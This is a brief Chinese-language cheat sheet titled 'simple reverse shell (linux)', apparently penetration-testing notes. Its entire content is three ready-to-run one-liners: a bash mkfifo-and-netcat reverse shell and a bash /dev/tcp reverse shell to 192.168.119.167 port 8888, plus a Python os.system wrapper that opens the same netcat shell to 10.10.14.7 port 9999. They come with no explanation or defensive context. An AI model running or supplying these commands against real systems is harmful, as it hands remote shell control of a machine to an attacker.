# 简单反弹（linux）

‍

```bash
1. bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.119.167 8888 >/tmp/f
或者
bash -i >& /dev/tcp/192.168.119.167/8888 0>&1

2. python
import os;os.system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.7 9999 >/tmp/f’)
```

‍
